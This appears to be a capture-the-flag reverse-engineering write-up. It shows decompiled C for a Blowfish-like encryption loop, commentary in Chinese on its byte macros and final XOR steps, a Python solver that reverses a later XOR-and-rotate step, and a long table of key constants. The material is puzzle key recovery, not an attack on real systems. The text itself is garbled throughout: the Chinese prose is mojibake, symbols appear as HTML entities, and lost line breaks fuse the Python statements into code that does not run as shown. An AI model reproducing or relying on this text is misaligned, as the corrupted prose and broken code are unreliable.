å¦‚ä¸‹ unsigned int *__fastcall sub_7FF631BCF2E0(void *a1, __int64 a2, unsigned int *a3, _DWORD *a4, size_t a5, int a6)&#123; unsigned int *v7; // rcx unsigned __int64 v8; // rsi unsigned int *result; // rax unsigned int *v10; // r8 unsigned int v11; // r9d int v12; // ecx unsigned int v13; // ecx int v14; // edx unsigned int v15; // edx int v16; // ecx unsigned int v17; // ecx int v18; // edx unsigned int v19; // edx int v20; // ecx unsigned int v21; // ecx int v22; // edx unsigned int v23; // edx int v24; // ecx unsigned int v25; // ecx int v26; // edx unsigned int v27; // edx int v28; // ecx unsigned int v29; // ecx int v30; // edx unsigned int v31; // edx int v32; // ecx unsigned int v33; // ecx int v34; // edx unsigned int v35; // edx int v36; // ecx unsigned int v37; // ecx int v38; // edx unsigned int v39; // edx unsigned int v40; // r9d __m128i v41; // xmm5 int v42; // edx unsigned int v43; // edx int v44; // ecx v7 = a3; v8 = a6; if ( a3 != (unsigned int *)a5 ) v7 = (unsigned int *)memcpy(a1, (const void *)a6, a5); result = v7; v10 = (unsigned int *)((char *)v7 + (v8 &amp; 0xFFFFFFFFFFFFFFF8LL)); if ( v8 >> 3 ) &#123; do &#123; v11 = *a4 ^ *result; *result = v11; v12 = result[1] ^ (a4[(unsigned __int8)v11 + 786] + (a4[BYTE1(v11) + 530] ^ (a4[HIBYTE(v11) + 18] + a4[BYTE2(v11) + 274]))); *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v12), _mm_cvtsi32_si128(v11)).m128i_u64[0]; v13 = a4[1] ^ v12; *result = v13; v14 = v11 ^ (a4[(unsigned __int8)v13 + 786] + (a4[BYTE1(v13) + 530] ^ (a4[HIBYTE(v13) + 18] + a4[BYTE2(v13) + 274]))); *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v14), _mm_cvtsi32_si128(v13)).m128i_u64[0]; v15 = a4[2] ^ v14; *result = v15; v16 = (a4[(unsigned __int8)v15 + 786] + (a4[BYTE1(v15) + 530] ^ (a4[HIBYTE(v15) + 18] + a4[BYTE2(v15) + 274]))) ^ v13; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v16), _mm_cvtsi32_si128(v15)).m128i_u64[0]; v17 = a4[3] ^ v16; *result = v17; v18 = (a4[(unsigned __int8)v17 + 786] + (a4[BYTE1(v17) + 530] ^ (a4[HIBYTE(v17) + 18] + a4[BYTE2(v17) + 274]))) ^ v15; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v18), _mm_cvtsi32_si128(v17)).m128i_u64[0]; v19 = a4[4] ^ v18; *result = v19; v20 = (a4[(unsigned __int8)v19 + 786] + (a4[BYTE1(v19) + 530] ^ (a4[HIBYTE(v19) + 18] + a4[BYTE2(v19) + 274]))) ^ v17; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v20), _mm_cvtsi32_si128(v19)).m128i_u64[0]; v21 = a4[5] ^ v20; *result = v21; v22 = (a4[(unsigned __int8)v21 + 786] + (a4[BYTE1(v21) + 530] ^ (a4[HIBYTE(v21) + 18] + a4[BYTE2(v21) + 274]))) ^ v19; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v22), _mm_cvtsi32_si128(v21)).m128i_u64[0]; v23 = a4[6] ^ v22; *result = v23; v24 = (a4[(unsigned __int8)v23 + 786] + (a4[BYTE1(v23) + 530] ^ (a4[HIBYTE(v23) + 18] + a4[BYTE2(v23) + 274]))) ^ v21; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v24), _mm_cvtsi32_si128(v23)).m128i_u64[0]; v25 = a4[7] ^ v24; *result = v25; v26 = (a4[(unsigned __int8)v25 + 786] + (a4[BYTE1(v25) + 530] ^ (a4[HIBYTE(v25) + 18] + a4[BYTE2(v25) + 274]))) ^ v23; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v26), _mm_cvtsi32_si128(v25)).m128i_u64[0]; v27 = a4[8] ^ v26; *result = v27; v28 = (a4[(unsigned __int8)v27 + 786] + (a4[BYTE1(v27) + 530] ^ (a4[HIBYTE(v27) + 18] + a4[BYTE2(v27) + 274]))) ^ v25; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v28), _mm_cvtsi32_si128(v27)).m128i_u64[0]; v29 = a4[9] ^ v28; *result = v29; v30 = (a4[(unsigned __int8)v29 + 786] + (a4[BYTE1(v29) + 530] ^ (a4[HIBYTE(v29) + 18] + a4[BYTE2(v29) + 274]))) ^ v27; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v30), _mm_cvtsi32_si128(v29)).m128i_u64[0]; v31 = a4[10] ^ v30; *result = v31; v32 = (a4[(unsigned __int8)v31 + 786] + (a4[BYTE1(v31) + 530] ^ (a4[HIBYTE(v31) + 18] + a4[BYTE2(v31) + 274]))) ^ v29; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v32), _mm_cvtsi32_si128(v31)).m128i_u64[0]; v33 = a4[11] ^ v32; *result = v33; v34 = (a4[(unsigned __int8)v33 + 786] + (a4[BYTE1(v33) + 530] ^ (a4[HIBYTE(v33) + 18] + a4[BYTE2(v33) + 274]))) ^ v31; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v34), _mm_cvtsi32_si128(v33)).m128i_u64[0]; v35 = a4[12] ^ v34; *result = v35; v36 = (a4[(unsigned __int8)v35 + 786] + (a4[BYTE1(v35) + 530] ^ (a4[HIBYTE(v35) + 18] + a4[BYTE2(v35) + 274]))) ^ v33; *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v36), _mm_cvtsi32_si128(v35)).m128i_u64[0]; v37 = a4[13] ^ v36; *result = v37; result += 2; v38 = (a4[(unsigned __int8)v37 + 786] + (a4[BYTE1(v37) + 530] ^ (a4[HIBYTE(v37) + 18] + a4[BYTE2(v37) + 274]))) ^ v35; *((_QWORD *)result - 1) = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v38), _mm_cvtsi32_si128(v37)).m128i_u64[0]; v39 = a4[14] ^ v38; *(result - 2) = v39; v40 = v39; v41 = _mm_cvtsi32_si128(v39); v42 = v37 ^ (a4[(unsigned __int8)v39 + 786] + ((a4[HIBYTE(v39) + 18] + a4[BYTE2(v39) + 274]) ^ a4[BYTE1(v39) + 530])); *((_QWORD *)result - 1) = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v42), v41).m128i_u64[0]; v43 = a4[15] ^ v42; *(result - 2) = v43; v44 = v40 ^ (a4[(unsigned __int8)v43 + 786] + (a4[BYTE1(v43) + 530] ^ (a4[HIBYTE(v43) + 18] + a4[BYTE2(v43) + 274]))); *((_QWORD *)result - 1) = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v43), _mm_cvtsi32_si128(v44)).m128i_u64[0]; *(result - 1) = a4[16] ^ v44; *(result - 2) = a4[17] ^ v43; &#125; while ( result != v10 ); &#125; return result;&#125;è¿™ä¸ªåŠ å¯†ä¹Ÿæ˜¯æœ‰è¿¹å¯å¾ªçš„ï¼Œå°±æ˜¯å¼‚æˆ–æ¥ï½å¼‚æˆ–å»ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªåŠ å¯†çœ‹æˆå¾ˆå¤šä¸‹æ–¹ä»£ç å—çš„é‡å¤ v11 = *a4 ^ *result; *result = v11; v12 = result[1] ^ (a4[(unsigned __int8)v11 + 786] + (a4[BYTE1(v11) + 530] ^ (a4[HIBYTE(v11) + 18] + a4[BYTE2(v11) + 274]))); *(_QWORD *)result = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v12), _mm_cvtsi32_si128(v11)).m128i_u64[0];è¿™ä¸ªç®—æ³•è¦æ³¨æ„ (unsigned __int8) , BYTE1 , HIBYTE , BYTE2 è¡¨ç¤ºçš„å«ä¹‰ å‡è®¾ v11=0x12345678 , é‚£ä¹ˆ (unsigned __int8)v11 = 0x78 BYTE1(v11) = 0x56 HIBYTE(v11) = 0x12 BYTE2(v11) = 0x34 while å¾ªç¯æœ€åçš„ä¸¤ä¸ªå¼‚æˆ–ä¹Ÿä¸èƒ½å¿½ç•¥ *(result - 1) = a4[16] ^ v44;*(result - 2) = a4[17] ^ v43;æé†’ä¸€ç‚¹ï¼Œå½“ä½ åœ¨ result æ•°ç»„çš„å†…å­˜åœ°å€æ‰“ä¸‹ç¡¬ä»¶æ–­ç‚¹åï¼Œä¼šå‘ç°è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œåé¢è¿˜æœ‰ä¸€ä¸ªå°å‹çš„åŠ å¯† è®°å¾—ä¹Ÿè¦æŠŠè¿™ä¸ªå¾ªç¯å·¦ç§»ä¸‰ä½å†å¼‚æˆ–ä¹Ÿä½“ç°åˆ° exp é‡Œé¢å» é‚£å°±å¯ä»¥å†™å‡º exp æ¥äº† import ctypesimport binasciidef deal_last_rev(hex_num): # hex_num = 0x9DDC359E byte1 = (hex_num >> 24) &amp; 0xFF byte2 = (hex_num >> 16) &amp; 0xFF byte3 = (hex_num >> 8) &amp; 0xFF byte4 = hex_num &amp; 0xFF byte1 = ctypes.c_uint8(byte1) byte1.value ^= 0x0C # print(bin(byte1.value)) byte1.value = ((byte1.value&lt;&lt;5)&amp;0xff)|((byte1.value>>3)&amp;0xff) # print(bin(byte1.value)) byte2 = ctypes.c_uint8(byte2) byte2.value ^= 0x0C byte2.value = ((byte2.value&lt;&lt;5)&amp;0xff)|((byte2.value>>3)&amp;0xff) byte3 = ctypes.c_uint8(byte3) byte3.value ^= 0x0C byte3.value = ((byte3.value&lt;&lt;5)&amp;0xff)|((byte3.value>>3)&amp;0xff) byte4 = ctypes.c_uint8(byte4) byte4.value ^= 0x0C byte4.value = ((byte4.value&lt;&lt;5)&amp;0xff)|((byte4.value>>3)&amp;0xff) result = (byte1.value &lt;&lt; 24) | (byte2.value &lt;&lt; 16) | (byte3.value &lt;&lt; 8) | byte4.value return resultdef rrev(hex_num): byte1 = (hex_num >> 24) &amp; 0xFF byte2 = (hex_num >> 16) &amp; 0xFF byte3 = (hex_num >> 8) &amp; 0xFF byte4 = hex_num &amp; 0xFF result = (byte4 &lt;&lt; 24) | (byte3 &lt;&lt; 16) | (byte2 &lt;&lt; 8) | byte1 return resulta4 = [0x2FE994E0, 0xC11E954B, 0xF00E449D, 0xDA7858A1, 0xCEF89B0A, 0xB06F5FD9, 0x32646DF2, 0x3D31F55A, 0xE90EC568, 0xF69C53B7, 0x3F2C9C44, 0x6DD31BC7, 0xF4AF32ED, 0x4381F9C7, 0x26EB634F, 0xE5FBA3CF, 0xAB36B7FB, 0xB295A35B, 0x732F94D5, 0xEEC6C173, 0x572989EB, 0xCB9DDFD9, 0xAF9F559B, 0xFC9A4D99, 0xE14B9327, 0x3A04B794, 0x588C93A9, 0xB75B93DF, 0xFC906662, 0x7043911C, 0x71F1F968, 0xAEC02345, 0x642C0A73, 0xE92FD10A, 0xF749BE48, 0x02C776F8, 0x78D847B6, 0xD9D395EA, 0xC091094D, 0x5ED1A899, 0x8535B464, 0xC9B571E4, 0xD5974F29, 0x69BF7AC2, 0x78862ED1, 0xAEA837DD, 0x4D8BF9B9, 0x358766D5, 0x0194484B, 0xB2C46C77, 0xA5B3F500, 0x21B29753, 0xC8BE07B5, 0x9B982150, 0xAAB0F261, 0xC54587BA, 0x5FE3F7A2, 0xB94325DF, 0x814B1991, 0x05A7CBC5, 0xC01E7032, 0x2D802ED9, 0xF920C022, 0xDC7AAE97, 0x3904A61F, 0x8A725DE7, 0x9E49A196, 0xF7AE5DF0, 0x19EB724A, 0x03FB7CF7, 0x2F9234AF, 0x72006306, 0x9123B54C, 0xB8164574, 0x69438E25, 0xD56F49D2, 0x681CB159, 0x8CDADDF4, 0xFCE82189, 0x50A905D4, 0x9386E52A, 0xCACC2368, 0x38B3A6A3, 0x3CA0DF37, 0xF51D7DD5, 0x24242D86, 0x7F8D441B, 0xD6E5BBA6, 0x263CBCD8, 0xE3ADDED7, 0x6D543F5E, 0x4716D72F, 0x2799B4E3, 0xA80B339E, 0x2A9A3565, 0x812ECA54, 0x58A9D96E, 0xCF3ACC39, 0x2777DC51, 0x520F1EF8, 0xF4A2399E, 0x0BB7A943, 0x9BB2287A, 0x074C750B, 0xE89F260C, 0xF39494C9, 0x62154805, 0x2869BB07, 0x71D3C65F, 0x83F883C6, 0x179A9696, 0xD53E6014, 0x28A45FBB, 0x565C9FD2, 0x4CC74F44, 0x50FD664A, 0x0789A88D, 0x7454AE55, 0x4AD93102, 0xC4C64C97, 0x146A16C5, 0xA6337621, 0x601474DD, 0xD9CCBFA2, 0xD628928F, 0xEC0EF727, 0x4E728F4C, 0x6D394E22, 0x23252BC3, 0x410DB272, 0x60C5467F, 0x28C58C78, 0x45B98E47, 0x2D453756, 0x9FC502FE, 0x2FAAA75C, 0xFECC881C, 0xC98742BD, 0x18FAB5A0, 0x96A2691B, 0x265C4ABE, 0x22E5221D, 0x79F147B5, 0xA4963A5A, 0x38A53CE1, 0xC5899BDF, 0xAFBEDE5A, 0xED2EF97D, 0x212A53AC, 0x2E7141D6, 0x2FCF2D57, 0xEFB9869F, 0xD4665961, 0x231BB16A, 0x12EF4976, 0x7DAF240E, 0x3B96114A, 0xD27BB394, 0x357215CD, 0xA4AAEF55, 0x17E76552, 0x6F57C2DD, 0x83ED82E0, 0xCAABAEA5, 0xE7F5B748, 0xAB0E7982, 0x54435C78, 0x366A7F66, 0x7F94D113, 0x0D96FFBB, 0x2A795FF7, 0x2641EF7A, 0x73C2CB56, 0x701792C4, 0x1CCD9DF5, 0x156882B1, 0x888343F4, 0xE22DB762, 0x9E4CCB4B, 0x21517A50, 0x072F9091, 0x3E06A3DE, 0x311619DD, 0xA0AB192D, 0x5F0D5CF1, 0xF05FCFEA, 0xE36DEA48, 0x3FC54006, 0xBA8849A7, 0xB32DC878, 0xC1FEF774, 0xE34A6EDB, 0x770A2D0D, 0xCDF8D3DC, 0x7EBE066A, 0x603CD5BC, 0x4C6B5E7B, 0x12E80727, 0xFB69C765, 0x87A42B29, 0xE73A641F, 0xD586AB9B, 0x3BB112B3, 0x59AF1110, 0x1F6FACFB, 0x52597DF3, 0x28EF38D8, 0xBA0432C7, 0x958FDEA9, 0x68678326, 0x2161A62B, 0x44C8C4A0, 0xB1D7A078, 0x205CA9E3, 0xD4B8C306, 0x63F9157D, 0x4AEDA561, 0xFB84C9D6, 0xD8988F07, 0xF21A9841, 0xF4E71FB2, 0x63232B2E, 0x6EBA9AFE, 0x2DAFE02C, 0xDCC6655E, 0xFDB3B0DE, 0x044C3EAD, 0x10468B3E, 0xDA71D948, 0x6BACCBE4, 0x9A7844FC, 0xDF7FE345, 0xCB06712C, 0x034AC145, 0x510E9532, 0x71EAFBC2, 0x44433456, 0xCB01159D, 0x4A1957DD, 0x73C8DF17, 0xC8DB9516, 0x1ADB1906, 0x676BCEC1, 0x08DAC3C4, 0x3CAD32A1, 0xD737D4F3, 0x20ACDE94, 0xAB6D02F3, 0x506E5C37, 0xEDF08E37, 0x668C8DD5, 0xEA33C67D, 0x35308BA4, 0x67F0A8BA, 0x166546B5, 0x38D06E3F, 0x68159FEC, 0x1CEC8FA1, 0x9917E8B9, 0x376C0882, 0x9AADF201, 0x42DACD9C, 0x37663273, 0x51639640, 0x3CA96C41, 0xFD7E97CE, 0x174CAD5D, 0xA7A5F995, 0x2C36EB62, 0x7AFCFC30, 0x23DC7E23, 0xD742DA78, 0x03D27CB1, 0x7E9EDC0A, 0x6A0FB256, 0x4FCDB0EF, 0x26CAB2D4, 0x095BA999, 0x839CB8C4, 0x288AE59D, 0x1F033326, 0x5E8761CF, 0x0648ED4C, 0x98C49A53, 0xE3C0390D, 0xAD642407, 0xBD269591, 0x32A2E629, 0xE3122457, 0x5D73ED1C, 0x33A26E04, 0x2E67DE60, 0x6F2B18E3, 0x4558EADB, 0xDBA1D8B3, 0x9CADF7B5, 0x5FFBB4EF, 0x805AD7D1, 0xFF84E641, 0x4D49B28B, 0x2A28EA66, 0x7BC6FA3C, 0x266731FC, 0x3AB4D8DA, 0xB43EB68E, 0x9C4D6F43, 0x1CCE439F, 0xB625A0CE, 0x4B78AF95, 0xD06A3FF7, 0x5C8A2078, 0xFD9FA69D, 0x7BF98A71, 0xEE90B86D, 0xA442A73A, 0xB5A4A212, 0xA8E481F6, 0x4C6FD0BD, 0xA7706FB4, 0x3569127F, 0x59DFADB6, 0x2AB4FB23, 0x3604808A, 0xF3779794, 0xAA5A7EDF, 0x2ECF97BA, 0x969504A5, 0xCD05B77F, 0x5321DB1D, 0xD8BABA9C, 0x7A97EF53, 0x37231A53, 0x366BFEC5, 0x9BD96A49, 0x5A6C7F46, 0xE47BD143, 0x13FD722B, 0xF9A52E09, 0x6420A5BC, 0x8A8BB90C, 0x8234235E, 0x215EC40C, 0x46790597, 0x825EA222, 0xB783D749, 0x24A8815F, 0x2F74A78E, 0xD9E403D4, 0x63E17B10, 0xB6226CEF, 0x0E0F4381, 0xCA7D3369, 0x728C9C6B, 0xB14ECC63, 0x991A0F0E, 0xB0422615, 0x4C2FD823, 0x3302908B, 0xBAAF7739, 0x357EF5BC, 0x4CC6687F, 0xDD2F23B7, 0xA3AC1329, 0xC167B555, 0xE1F9B87B, 0x2B65D3B4, 0x4368817B, 0x03DAF56A, 0x9AE59AB9, 0xF5EAC7EE, 0xB36417A7, 0xF8FC224A, 0xA7E519FE, 0x8637329C, 0xB21461FD, 0xAED97750, 0x8744167F, 0x4669E638, 0x4E1B3B1A, 0xD377B3F7, 0xF514B3B6, 0x707A415C, 0x0AB652F0, 0xBC513A6D, 0x4FCE3F92, 0x96CBEE70, 0x31351026, 0xD37A9F73, 0x4DD00F9E, 0x047C1B22, 0x071DF745, 0x3A7697BE, 0xE24EDC03, 0x37233D96, 0x02373DD2, 0x26396C2B, 0x2229D430, 0x770CE3E3, 0xDE942CD0, 0x3F79B030, 0x5149DB45, 0x67FFE1C5, 0x78F66A56, 0x0E2313EA, 0xE13FE0C7, 0xA0C51FC4, 0xC11D9CA7, 0x709A60B2, 0x32EC174F, 0xC8CA5D05, 0x3351393B, 0x57846D6C, 0x22834834, 0x0FFA5DFE, 0x95DB516A, 0xC61E38F0, 0x15A3EE21, 0x4A587F75, 0x5BE749D7, 0xBBF167D7, 0x7334E07D, 0x09606180, 0x8BB6560E, 0xD35FFC0F, 0x34DCFBCC, 0x3E98BA62, 0x8A33C7EF, 0x19763E8B, 0x01FA474D, 0x529A6743, 0xF65D218C, 0xE0D70194, 0xBC879FCC, 0xE9DB6228, 0x07D566B6, 0x4C1B0D84, 0x945ABD96, 0xD1196C6E, 0x81EE67CC, 0xAD1721AE, 0xC987453F, 0x063CEB9F, 0xB27F0A73, 0xB5997727, 0x69D5B851, 0x02F7D0A1, 0x074F31CB, 0x53088D46, 0xBF2D83C4, 0x6C75BC86, 0x3B888596, 0x2EA614FE, 0x9E16DD01, 0xED1F5D7C, 0x9916A175, 0xD610A890, 0x7DF08F91, 0x435A4D29, 0xB7B5E450, 0x76FA8AAC, 0x050ADB83, 0x9CF8C712, 0xF08E8112, 0x9BAC9884, 0x5568DDC3, 0x4BE91FFE, 0x5B230AA2, 0x6BFDA2E9, 0xD26E1DFB, 0xF24668C7, 0x5464086A, 0xFFBB1CF3, 0x13313B25, 0x04D2D867, 0x5C47617D, 0x33A3150D, 0x007C3A17, 0x87DF6435, 0x8937F0DF, 0x3A707415, 0x3B2CFAE3, 0xC46C894B, 0xA0BE1104, 0xE2BECABC, 0xE42FDEED, 0x21913FA9, 0x1C30A346, 0x12758853, 0x57143736, 0x67E8119A, 0xD49D2036, 0x56AC8659, 0xA2DBB273, 0xFAB5912A, 0x75903A11, 0x9F1CC55A, 0x12554844, 0x658813AD, 0xBA08D453, 0x93AD4948, 0xEDDC0E10, 0xE25B6FD1, 0x9DF9AFCC, 0x2E98B6A2, 0x731A29AB, 0x930F9D67, 0x4771AC8E, 0xDFE58864, 0x4B572200, 0x67C22CE4, 0x1C5CB393, 0x7F18DC62, 0xBAFE6E58, 0x8F157813, 0xEDBB60E4, 0x17CC1A84, 0x5F7D0A2E, 0x64091858, 0x7BAF9420, 0xE1C89AA7, 0x525DF47C, 0x12CDE243, 0x0E25EC45, 0x9B36BC9F, 0x78B1715D, 0x962F9E9F, 0x7C18C853, 0xF1A8E5E3, 0x3C7FA3EE, 0xC119713F, 0x499EBAED, 0x71E46262, 0x9E42E3EF, 0x46C80691, 0xE4B23574, 0xF5BABE2B, 0x5B2C9A33, 0x296DFA2B, 0x9CEC6D11, 0x4B8A27BF, 0xC1C9FAE3, 0xFE7DCB7D, 0x58EBCAFE, 0xAFC4FB8C, 0xC277EB5C, 0x3176F3AC, 0xBC6DD7C1, 0x92E42C52, 0x18381B68, 0xB6ADFC6F, 0x7F477C10, 0xD43CCEDC, 0x1FA5633B, 0x3C8E5DF4, 0x2B48DCD9, 0x8C326067, 0x567DDE4E, 0x135E0F94, 0x765226D0, 0x5E1E4408, 0xEEAE88D4, 0x082C696B, 0x80A41500, 0xF3964793, 0x8589F6BA, 0x52B1E0B9, 0xBDA9EED6, 0x5542F81B, 0xAF48CA37, 0x1D014D51, 0xE38EA0E3, 0x1AA9456C, 0x21F5284A, 0xFB3B912D, 0xFCBCE946, 0xD54DB4A9, 0xE0EB8A10, 0x71B621D0, 0x0926496F, 0x79BBECDF, 0xC2E04AB2, 0x5C3B27A9, 0x20521B1E, 0xF644B47A, 0x918AE499, 0x2A1957E3, 0xA99F9DE2, 0x0CB70521, 0xAA2B2092, 0xC9F228EA, 0x6D683F3E, 0xE3F41AE0, 0x464A1769, 0x9C03F898, 0xDE9509F6, 0x732AEA1F, 0x146E5313, 0x8721E289, 0xAD6C48EF, 0x920B4228, 0x00FB935C, 0x0071D1DE, 0x7677932B, 0xACC60C24, 0x2B2C304C, 0x2E8661EC, 0xC7044B76, 0x64A3E5C6, 0x9684B218, 0x708EE6E2, 0x5DC74CA9, 0xE4BC1927, 0x22418B42, 0xE8E3D9C2, 0x5466078D, 0xBD66ED30, 0xDDE518BC, 0x6A6C32B9, 0x5BD25D34, 0xF7AA086E, 0xB8B683D5, 0x6EDD605B, 0xDA373814, 0xC26A335E, 0xA1077DB1, 0xEE9B3078, 0x2B2A915D, 0xCEED5305, 0x78E15F73, 0x1F9CFEBC, 0xF25A97FF, 0xFD36081E, 0xF60AC26D, 0xFE0C1AD0, 0x130FF5E5, 0xE1B8485A, 0x2A6200A2, 0xE71DDBAF, 0x157EE174, 0x8AC40711, 0xDAD02A4F, 0xA6AF6F7C, 0x9AB6D314, 0xF51E249C, 0xB18B878B, 0xE0547C50, 0x2202349F, 0x0F007C35, 0xF96A3AC7, 0x070EC924, 0x8CAFD12E, 0x93AAD3F8, 0x76CC52D8, 0x9C255CE4, 0x34F401D0, 0x6B479EAF, 0x7D45F765, 0xEBD846DB, 0xB4660D11, 0x66675434, 0xEE4E8855, 0x3C9898DA, 0xCCC78B80, 0x49E7F697, 0x8C8C25E1, 0xD8CBDCD6, 0xEE8D2953, 0x3F0F1EAA, 0xB3974DB4, 0xEEE04672, 0xCF3BEB72, 0x7322BCAD, 0x2052FEE1, 0x02961CC1, 0x5EBF91D2, 0x84B3B0CD, 0xECD5CC47, 0x6B72E6FD, 0x5FB337CB, 0xDC046235, 0xB3554069, 0x62E8D358, 0x2DBDEB7E, 0x736553EC, 0x0E465ED1, 0x009754A7, 0x9AD76638, 0x186AE66A, 0x8F34832E, 0xF4C54676, 0x4F5AC24D, 0x83734B08, 0x3E01D7ED, 0x31F830B6, 0x0B71C039, 0xF062BAFC, 0xC19CB1CA, 0x81A94E9B, 0x43F753CC, 0xAE467CB1, 0x3A24425D, 0x993840C2, 0x029E3F23, 0x189CEBD6, 0x30AE5F1F, 0x31C18967, 0x33009CD8, 0xF70963CF, 0x71B25C85, 0x9776E649, 0x1DC69634, 0x67C5F945, 0xDD8C3FC1, 0xA6B267CF, 0x67828F15, 0x258CCEAA, 0xDE7E40B0, 0x3FE203DB, 0x7F841970, 0x6F60AD42, 0x155E8ED0, 0x36CC984E, 0xB358111D, 0x82C7A44C, 0xF7D1361A, 0x4D0DD4EC, 0x9267C5FA, 0x5E0A7558, 0xCBED3CF6, 0xE43E5AE1, 0x7C3B1BB5, 0xE635509E, 0xA4B279FC, 0x1BFDA0F9, 0x9C3A46F9, 0xBF0A3982, 0x18999CE5, 0xFBB9999B, 0x5626E83B, 0xEC72FC45, 0xCF4EAB7E, 0xAB05621A, 0xA86466F0, 0x926F02E5, 0x0EA172C2, 0x882777AB, 0x490AE628, 0xDD8A4DA2, 0x2C934F7B, 0x88797186, 0x56D82195, 0x627D7C88, 0x045AF90D, 0x655118F9, 0x42F76C99, 0xF2122134, 0x022396CD, 0x25120833, 0xC6CD6F93, 0xAF7C08DF, 0x2DA99B63, 0x8EF8CF03, 0xB8098054, 0x4E9B2F5A, 0x022B0AEC, 0x1459055E, 0x02A0033F, 0xED67B9C8, 0x758057A5, 0xC7D8BA2A, 0xD4CC7CC6, 0x5F0B2597, 0x5AB84FFA, 0x496D1EE7, 0x8550FDA1, 0xDBBBDC70, 0x63149847, 0xC7CA2496, 0x96DBDCB7, 0xE2D4954A, 0xB9EC57F9, 0x6C70642C, 0x3D7B39F4, 0xF6161271, 0xE73A4943, 0x0EAA2FD6, 0xAB22A4BF, 0x134902F9, 0x1C4BA4DD, 0x558D617A, 0x8863374E, 0xC2EC82B0, 0x031A8ADE, 0x1741E8B1, 0x8F00A1CC, 0xF452F18F, 0x3A6E18D3, 0x6956DC4D, 0xDFA8EC1F, 0x69C52F20, 0x1ED99E2B, 0xEF7BAE7D, 0x7AF77378, 0x0B290733, 0x8C274A3E, 0x1F951C6C, 0xA3DDCEAC, 0x56F44ACB, 0x2270CE33, 0x9D874A9C, 0xF3A0F33E, 0xAFD74932, 0x2478581C, 0x551C9D3C, 0xAD063AA2, 0x31D17C9C, 0x88F7D6A0, 0x6DDD4F10, 0xDA0E114D, 0x8C2ABC96, 0x6FA83A7A, 0xE2452395, 0xA8219761, 0x620D783E, 0xAC489654, 0x3C1ACE7E, 0xC9C2A9BE, 0x7145AE6D, 0x4EF2ADDF, 0x53CA37A2, 0xA0A8A218, 0x67FD8F21, 0xBEAD8745, 0xB7711AD9, 0xD52B427F, 0x67ABBF1E, 0x0F66B464, 0xEB331E94, 0xADAAB204, 0x87756C23, 0x67F375BF, 0x54753FD8, 0x33ABC12D, 0x8F401EA1, 0x3C88D6FE, 0x615451C9, 0x87C32614, 0x268D494B, 0xF2AD7423, 0xCB949DA5, 0x25B4196E, 0xB2C5DF95, 0x8409721F, 0x0F7B5C12, 0x5E25EEEA, 0xC0F401B7, 0xA2DAEE3E, 0xF3AEAE52, 0x2A464F0D, 0x9CFB83EC, 0xF6E0EE51, 0x4774C554, 0x22DDFDE9, 0x5B599A74, 0x80EDBDE4, 0x2CC61BBD, 0xD824B10E, 0x2D0C3300, 0x99845362, 0xDEA64CE6, 0x575771AA, 0x961A3F14, 0x1432BEA6, 0x7D4FFF90, 0xF583772A, 0x4EE7C522, 0x07E4DEE6, 0x2C128C64, 0xD7D50924, 0x8223F310, 0x40BE7E09, 0x74DBC2E0, 0xBE3CDE01, 0x3E608447, 0xBD6A380E, 0xE5961202, 0xD34E32A0, 0x2539B5C0, 0x873A67C2, 0x239775F8, 0x1F9F60E1, 0xB63D3CF1, 0x30A5AF81, 0x8FD564FB, 0xA569DC35, 0x0D615EF8, 0xC49C2E07, 0xFBF7F35C, 0x9EDFEFF3, 0x148314D8, 0x8181CDF7, 0x7FA7653C, 0x5F40A6D5, 0xA994DB03, 0xBCCB55CC, 0x5D52D879, 0x65117BDD, 0x7D7F51D8, 0xB1BC1D10, 0x1F00F42E, 0x5C9957B7, 0x48C37C3B, 0x6F3D7E80, 0xC5158369, 0xF405690D, 0x49DACE68, 0xD2AC0D1D, 0xB399102A, 0x69F65B83, 0x324344F5, 0xA5D875EE, 0xBF2BD3F3, 0x2BB0CCCB, 0x7D6A05CF, 0x21AF29EB, 0x6367765B, 0xAD469391, 0xB1BCC75E, 0xC0518872, 0x94C52623, 0x1FB253E8, 0xAA314EB5, 0xCF2F792C, 0x00B08FF5, 0x90575FED, 0x16C1CF89, 0x2331EE19, 0x52590B8C, 0x06B4B6EC, 0xA46464C8, 0x955218F8, 0x6A75EFF8, 0xEEF53D04, 0x44650DB6, 0x03498691, 0xFF27365F, 0x4BAB9F2C, 0x97607DF2, 0xF831B2F7, 0x779EE348, 0xCF0D1F54, 0x6BA70606, 0x32C0B10C, 0xF33943ED, 0x31988090, 0x84B21458, 0x8701CC78, 0x632CF196, 0x0993A1D0, 0x55662BF3, 0x568FBC94, 0x76AE6160, 0x5FF57B9C, 0xE326F5C6, 0x161B30B8, 0x8132A32A, 0xAD3831C3, 0x032DDBA5, 0xFB836CDC, 0x2EC6CBF8, 0x6C831855, 0xEE8C0010, 0x5A64B2E3, 0xB3E9EC1B, 0xE6EAFBD0, 0xC1F2591A, 0x8E587584, 0x56398F78, 0x92DDB0C1, 0x1F76C224, 0x805FCD53, 0x74FF5EE9, 0xDC2FCEDA, 0x3E90D994, 0x15617A80, 0x4F1E077E, 0xB5DF16BF, 0x2854C143, 0x694E02C3, 0x4C3588AC, 0xCC7758A2, 0xA23959C6, 0x612647FF, 0xF2B95082, 0x1031E285, 0x42EFF0B4, 0xEFBCBD1F, 0x3499362D, 0xAD421535, 0x02911B94, 0x01CB816F, 0x0E274A1A, 0x7EDF8280, 0xADBD72AE, 0xDB20BBB3, 0x66CB4B73, 